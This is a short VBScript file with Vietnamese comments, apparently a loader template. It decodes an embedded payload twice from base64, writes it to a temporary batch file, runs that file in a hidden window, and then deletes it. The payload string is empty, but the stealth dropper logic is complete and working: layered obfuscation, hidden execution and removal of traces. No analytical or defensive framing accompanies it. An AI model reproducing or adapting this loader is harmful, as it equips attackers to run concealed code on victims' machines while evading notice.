
' === VBS: GIẢI MÃ BASE64 2 LẦN VÀ CHẠY .BAT ẨN ===
Dim fso, shell, tempFolder, batPath, doubleEncoded, firstDecoded, finalDecoded

doubleEncoded = ""

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")
tempFolder = shell.ExpandEnvironmentStrings("%TEMP%")
batPath = tempFolder & "\\~temp.bat"

Function DecodeBase64(strData)
    Dim xml, node
    Set xml = CreateObject("Msxml2.DOMDocument.3.0")
    Set node = xml.createElement("b64")
    node.dataType = "bin.base64"
    node.text = strData
    DecodeBase64 = node.nodeTypedValue
End Function

' === GIẢI MÃ 2 LẦN ===
firstDecoded = DecodeBase64(doubleEncoded)
firstText = BytesToString(firstDecoded)
finalDecoded = DecodeBase64(firstText)

' === GHI FILE BẰNG ADODB.Stream ===
Dim stream
Set stream = CreateObject("ADODB.Stream")
stream.Type = 1 ' binary
stream.Open
stream.Write finalDecoded
stream.SaveToFile batPath, 2 ' 2 = overwrite
stream.Close

' === CHẠY BATCH ẨN ===
shell.Run """" & batPath & """", 0, False
WScript.Sleep 3000
On Error Resume Next
fso.DeleteFile batPath, True

' === CHUYỂN BYTE() -> STRING UTF8 ===
Function BytesToString(bytes)
    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 'binary
    stream.Open
    stream.Write bytes
    stream.Position = 0
    stream.Type = 2 'text
    stream.Charset = "utf-8"
    BytesToString = stream.ReadText
    stream.Close
End Function
